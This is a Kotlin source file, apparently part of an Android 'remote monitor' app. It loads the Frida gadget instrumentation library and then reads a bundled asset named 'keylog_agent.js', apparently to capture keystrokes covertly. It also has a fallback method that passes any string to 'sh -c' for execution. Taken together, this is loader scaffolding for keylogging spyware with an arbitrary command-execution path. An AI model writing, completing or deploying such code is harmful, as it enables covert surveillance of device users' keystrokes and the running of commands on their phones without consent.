package com.remotemonitor.test

import android.content.Context
import android.util.Log
import java.io.File

object FridaLoader {
    private const val TAG = "FridaLoader"

    fun init(context: Context) {
        try {
            // Carrega a biblioteca nativa apenas se estiver empacotada no APK.
            System.loadLibrary("frida-gadget")
            Log.i(TAG, "Frida gadget carregado com sucesso")

            // Aguardar um pouco para o gadget inicializar
            Thread {
                Thread.sleep(2000)
                loadKeylogAgent(context)
            }.start()
        } catch (e: Throwable) {
            Log.w(TAG, "Falha ao carregar Frida gadget", e)
        }
    }

    private fun loadKeylogAgent(context: Context) {
        try {
            // Mantem leitura para validar que o asset existe no pacote.
            context.assets.open("keylog_agent.js").bufferedReader().use { it.readText() }
            Log.i(TAG, "Agent Frida encontrado nos assets")
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao carregar agent Frida", e)
        }
    }

    // Fallback: carregar agent via Process se Frida não estiver disponível
    fun loadAgentViaProcess(agentCode: String) {
        try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", agentCode))
            proc.waitFor()
            Log.i(TAG, "Agent carregado via process")
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao carregar agent via process", e)
        }
    }
}
